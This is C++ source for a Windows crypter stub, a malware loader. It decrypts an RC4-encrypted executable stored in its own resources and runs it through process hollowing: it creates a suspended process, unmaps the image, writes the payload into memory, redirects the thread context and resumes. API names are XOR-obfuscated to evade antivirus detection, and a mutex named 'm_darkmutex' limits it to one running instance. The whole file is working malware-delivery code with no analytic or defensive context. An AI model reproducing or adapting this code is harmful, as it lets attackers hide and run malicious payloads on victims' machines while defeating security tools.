#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include "strings.h"
#include "EncryptApi.hpp"

  /////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////// XOR DECRYPTION   //////////////////////////////////////////
  /////////////////////////////////////////////////////////////////////////////////////////

void xor(char *str, const int tamStr)
{
   for(int n=0; n<=tamStr; n++)
      str[n] ^= clave[n%tamClave];
}


  /////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////// PE INJECTION ////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////////////////////

PIMAGE_DOS_HEADER pidh;
PIMAGE_NT_HEADERS pinh;
PIMAGE_SECTION_HEADER pish;

DWORD dwFileSize;
LPBYTE lpFileBuffer;


VOID InjPE(LPSTR szProcessName, LPBYTE lpBuffer)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ctx.ContextFlags = CONTEXT_FULL;
	pidh = (PIMAGE_DOS_HEADER)&lpBuffer[0];
	if(pidh->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;
	}
	pinh = (PIMAGE_NT_HEADERS)&lpBuffer[pidh->e_lfanew];
	if(pinh->Signature != IMAGE_NT_SIGNATURE)
	{
		return;
	}

	//decrypt
	xor(strNTdll, 9);
	xor(strKernel32, 12);
	xor(strGetModuleHandleA, 16);
	xor(strGetProcAddress, 14);
	xor(strCreateProcessA, 14);
	xor(strNtUnmapViewOfSection, 20);
	xor(strVirtualAllocEx, 14);
	xor(strWriteProcessMemory, 18);
	xor(strGetThreadContext, 16);
	xor(strSetThreadContext, 16);
	xor(strResumeThread, 12);

   //encryptapi
   EncryptApi<HMODULE>	myGetModuleHandle		(strGetModuleHandleA,"kernel32.dll", 5);
   EncryptApi<FARPROC>	myGetProcAddress		(strGetProcAddress,"kernel32.dll", 5);
   EncryptApi<BOOL>		myCreateProcess			(strCreateProcessA,"kernel32.dll", 5);
   EncryptApi<LONG>		myNtUnmapViewOfSection	(strNtUnmapViewOfSection,"ntdll.dll", 5);
   EncryptApi<LPVOID>   myVirtualAllocEx		(strVirtualAllocEx,"kernel32.dll", 2);
   EncryptApi<BOOL>		myWriteProcessMemory	(strWriteProcessMemory,"kernel32.dll", 5);
   EncryptApi<BOOL>		myGetThreadContext		(strGetThreadContext,"kernel32.dll", 5);
   EncryptApi<BOOL>		mySetThreadContext		(strSetThreadContext,"kernel32.dll", 5);
   EncryptApi<DWORD>	myResumeThread			(strResumeThread,"kernel32.dll", 5);


   // Call the API Functions

    myCreateProcess(10, NULL, szProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    myNtUnmapViewOfSection(2, pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);
	myVirtualAllocEx(5, pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	myWriteProcessMemory(5, pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, &lpBuffer[0], pinh->OptionalHeader.SizeOfHeaders, NULL);
	for(int i=0; i < pinh->FileHeader.NumberOfSections; i++)
	{
		pish = (PIMAGE_SECTION_HEADER)&lpBuffer[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
		myWriteProcessMemory(5, pi.hProcess, (LPVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), &lpBuffer[pish->PointerToRawData], pish->SizeOfRawData, NULL);
	}
	myGetThreadContext(2, pi.hThread, &ctx);
	ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	mySetThreadContext(2, pi.hThread, &ctx);
	myResumeThread(1, pi.hThread);
}




  /////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////// Ron's Code 4 (RC4) - Encryption ///////////////////////////////
  /////////////////////////////////////////////////////////////////////////////////////////


LPBYTE RC4(LPBYTE lpBuf, LPBYTE lpKey, DWORD dwBufLen, DWORD dwKeyLen)
{
	int a, b = 0, s[256];
	BYTE swap;
	DWORD dwCount;
	for(a = 0; a < 256; a++)
	{
		s[a] = a;
	}
	for(a = 0; a < 256; a++)
	{
		b = (b + s[a] + lpKey[a % dwKeyLen]) % 256;
		swap = s[a];
		s[a] = s[b];
		s[b] = swap;
	}
	for(dwCount = 0; dwCount < dwBufLen; dwCount++)
	{
		a = (a + 1) % 256;
		b = (b + s[a]) % 256;
		swap = s[a];
		s[a] = s[b];
		s[b] = swap;
		lpBuf[dwCount] ^= s[(s[a] + s[b]) % 256];
	}
	return lpBuf;
}


  /////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////// MAIN //////////////////////////////////////////////////
  /////////////////////////////////////////////////////////////////////////////////////////


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// decrypt
	xor(strOpenMutexA, 10);
	xor(strCreateMutexA, 12);
	xor(strGetModuleFileNameA, 18);
	xor(strSizeofResource, 14);
	xor(strLoadResource, 12);
	xor(strFindResourceA, 13);
	xor(strLockResource, 12);

	//encryptapi
    EncryptApi<HANDLE>	myOpenMutex				(strOpenMutexA,"kernel32.dll", 5);
    EncryptApi<HANDLE>	myCreateMutex			(strCreateMutexA,"kernel32.dll", 5);
	EncryptApi<DWORD>	myGetModuleFileName		(strGetModuleFileNameA,"kernel32.dll", 5);
    EncryptApi<DWORD>	mySizeofResource		(strSizeofResource,"kernel32.dll", 2);
	EncryptApi<HGLOBAL> myLoadResource			(strLoadResource,"kernel32.dll", 2);
	EncryptApi<HRSRC>	myFindResource			(strFindResourceA,"kernel32.dll", 2);
    EncryptApi<LPVOID>	myLockResource			(strLockResource,"kernel32.dll", 5);


	HANDLE hMutex;
	hMutex = myOpenMutex(3, MUTEX_ALL_ACCESS, FALSE, "m_darkmutex");
	if(hMutex == NULL)
	{
		hMutex = myCreateMutex(3, NULL, FALSE, "m_darkmutex");
	}
	else
	{
		return 0;
	}
	CHAR szFileName[MAX_PATH];
	myGetModuleFileName(3, NULL, szFileName, MAX_PATH);
	HRSRC hRsrc;
	hRsrc = myFindResource(3, NULL, MAKEINTRESOURCE(150), RT_RCDATA);
	if(hRsrc == NULL)
	{
		return 0;
	}
	DWORD dwFileSize;
	dwFileSize = mySizeofResource(2, NULL, hRsrc);
	HGLOBAL hGlob;
	hGlob = myLoadResource(2, NULL, hRsrc);
	if(hGlob == NULL)
	{
		return 0;
	}
	LPBYTE lpFile;
	lpFile = (LPBYTE)myLockResource(1, hGlob);
	if(lpFile == NULL)
	{
		return 0;
	}
	hRsrc = myFindResource(3, NULL, MAKEINTRESOURCE(151), RT_RCDATA);
	if(hRsrc == NULL)
	{
		return 0;
	}
	DWORD dwKeySize;
	dwKeySize = mySizeofResource(2, NULL, hRsrc);
	hGlob = myLoadResource(2, NULL, hRsrc);
	if(hGlob == NULL)
	{
		return 0;
	}
	LPBYTE lpKey;
	lpKey = (LPBYTE)myLockResource(1, hGlob);
	if(lpKey == NULL)
	{
		return 0;
	}
	InjPE(szFileName, RC4(&lpFile[0], &lpKey[0], dwFileSize, dwKeySize));
	return 0;
}
